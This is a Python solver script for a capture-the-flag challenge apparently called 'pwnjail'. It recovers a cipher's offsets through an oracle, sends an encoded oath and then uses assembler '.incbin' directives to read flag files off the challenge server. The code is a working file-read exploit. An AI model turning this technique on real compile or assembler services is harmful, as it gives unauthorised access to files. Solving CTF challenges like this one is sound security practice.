import argparse
import re
import socket
import subprocess
from typing import Callable, List, Optional, Sequence, Tuple

PRINT_MIN = 32
PRINT_MAX = 126
PRINT_RANGE = 95

OATH = [
    "I shall not harm.",
    "I shall not exploit without consent.",
    "I shall not access what is not mine.",
    "I shall not abuse knowledge or power.",
    "I shall act within scope and authorization.",
    "Night gathers, and now my watch begins, for this system and all systems to come.",
]


def shift_char(ch: str, off: int) -> str:
    v = ord(ch)
    if PRINT_MIN <= v <= PRINT_MAX:
        return chr(PRINT_MIN + ((v - PRINT_MIN + off) % PRINT_RANGE))
    return ch


def unshift_char(ch: str, off: int) -> str:
    v = ord(ch)
    if PRINT_MIN <= v <= PRINT_MAX:
        return chr(PRINT_MIN + ((v - PRINT_MIN - off) % PRINT_RANGE))
    return ch


class Tube:
    def __init__(self, read1: Callable[[], bytes], write: Callable[[bytes], None], close: Callable[[], None]):
        self._read1 = read1
        self._write = write
        self._close = close

    def recv_until_any(self, suffixes: Sequence[bytes]) -> Tuple[bytes, bytes]:
        data = bytearray()
        while True:
            b = self._read1()
            if not b:
                raise EOFError(f"Connection closed while waiting for prompt. Partial output: {bytes(data)!r}")
            data.extend(b)
            for suffix in suffixes:
                if data.endswith(suffix):
                    return bytes(data), suffix

    def sendline(self, s: str) -> None:
        self._write((s + "\n").encode())

    def close(self) -> None:
        self._close()


def spawn_local(path: str) -> Tube:
    proc = subprocess.Popen(
        ["python3", path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    if proc.stdin is None or proc.stdout is None:
        raise RuntimeError("Failed to create local process pipes")

    def read1() -> bytes:
        return proc.stdout.read(1)

    def write(data: bytes) -> None:
        proc.stdin.write(data)
        proc.stdin.flush()

    def close() -> None:
        if proc.poll() is None:
            proc.terminate()

    return Tube(read1, write, close)


def connect_remote(host: str, port: int) -> Tube:
    sock = socket.create_connection((host, port))

    def read1() -> bytes:
        return sock.recv(1)

    def write(data: bytes) -> None:
        sock.sendall(data)

    def close() -> None:
        sock.close()

    return Tube(read1, write, close)


def parse_last_line(data: bytes, prompt: bytes) -> str:
    body = data[: -len(prompt)] if prompt else data
    text = body.decode(errors="replace")
    lines = text.splitlines()
    return lines[-1].strip() if lines else ""


def ask_and_get_line(tube: Tube, payload: str) -> Tuple[str, bytes]:
    tube.sendline(payload)
    # Match longer prompt first so "asm_input> " is not truncated as just "> ".
    out, prompt = tube.recv_until_any([b"asm_input> ", b"> "])
    return parse_last_line(out, prompt), prompt


def recover_offsets(tube: Tube) -> List[int]:
    offsets: List[Optional[int]] = [None] * 12

    for j in range(12):
        oracle_bits: List[bool] = []
        for k in range(26):
            prefix = []
            for i in range(j):
                if offsets[i] is None:
                    raise RuntimeError(f"Internal error: offset {i} was not recovered before index {j}")
                cur_off = (offsets[i] + k) % 26
                prefix.append(unshift_char("1", cur_off))
            probe = "".join(prefix) + "0"
            line, _ = ask_and_get_line(tube, probe)
            oracle_bits.append(line == "None")

        found = None
        for cand in range(26):
            predicted = [shift_char("0", (cand + k) % 26).isdigit() for k in range(26)]
            if predicted == oracle_bits:
                found = cand
                break

        if found is None:
            raise RuntimeError(f"Could not recover offset[{j}] from oracle pattern")
        offsets[j] = found

    return [x if x is not None else 0 for x in offsets]


def encode_with_offsets(text: str, offsets: List[int]) -> str:
    out = []
    for i, ch in enumerate(text):
        idx = i % 12
        out.append(unshift_char(ch, offsets[idx]))
        offsets[idx] = (offsets[idx] + 1) % 26
    return "".join(out)


def run_oath(tube: Tube, offsets: List[int]) -> bytes:
    prompt = b"> "
    for line in OATH:
        payload = encode_with_offsets(line, offsets)
        reply, prompt = ask_and_get_line(tube, payload)
        if reply not in ("Hear my words, and bear witness to my vow.", "Your watch begins."):
            raise RuntimeError(f"Unexpected oath response: {reply!r}")
    if prompt != b"asm_input> ":
        raise RuntimeError("Did not reach assembler stage")
    return prompt


def try_incbin(tube: Tube, offsets: List[int], path: str) -> Optional[bytes]:
    asm_payload = f'.incbin "{path}"'
    encoded = encode_with_offsets(asm_payload, offsets)
    tube.sendline(encoded)

    try:
        out, prompt = tube.recv_until_any([b"asm_input> "])
    except EOFError as e:
        # On assembly failure, the service prints an error then exits.
        if "Could not compile shellcode" in str(e):
            return None
        raise
    text = out.decode(errors="replace")
    if "Compiled shellcode to X86!" not in text:
        return None

    lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
    hex_line = None
    for i, ln in enumerate(lines):
        if ln == "Compiled shellcode to X86!" and i + 1 < len(lines):
            hex_line = lines[i + 1]
            break
    if not hex_line:
        return None

    hex_line = hex_line.replace(" ", "")
    if not re.fullmatch(r"[0-9a-fA-F]+", hex_line) or len(hex_line) % 2:
        return None
    _ = prompt
    return bytes.fromhex(hex_line)


def extract_flag(blob: bytes) -> Optional[str]:
    m = re.search(rb"INSEC\{[^}\n\r]+\}", blob)
    if not m:
        return None
    return m.group(0).decode(errors="replace")


def solve(mode: str, host: str, port: int, local_path: str) -> str:
    candidate_paths = [
        "flag.txt",
        "/flag",
        "/app/flag",
        "/home/ctf/flag",
        "./flag",
        "flag",
    ]

    errors: List[str] = []
    for path in candidate_paths:
        tube = spawn_local(local_path) if mode == "local" else connect_remote(host, port)
        try:
            # Wait for initial interactive prompt.
            tube.recv_until_any([b"> "])

            offsets = recover_offsets(tube)
            print(f"Recovered offsets: {offsets}")

            run_oath(tube, offsets)
            print(f"Reached asm_input stage; trying {path}")

            blob = try_incbin(tube, offsets, path)
            if blob is None:
                errors.append(f"{path}: compile failed")
                continue

            flag = extract_flag(blob)
            if flag:
                return flag
            errors.append(f"{path}: compiled but no flag pattern")
        except Exception as e:
            errors.append(f"{path}: {e}")
        finally:
            tube.close()

    raise RuntimeError("No flag found via .incbin paths. Details: " + "; ".join(errors))


def main() -> None:
    parser = argparse.ArgumentParser(description="Solver for pwnjail challenge")
    parser.add_argument("--mode", choices=["local", "remote"], default="remote")
    parser.add_argument("--host", default="challs.insec.club")
    parser.add_argument("--port", type=int, default=40001)
    parser.add_argument("--local-path", default="pwnjail.py")
    args = parser.parse_args()

    flag = solve(args.mode, args.host, args.port, args.local_path)
    print(flag)


if __name__ == "__main__":
    main()
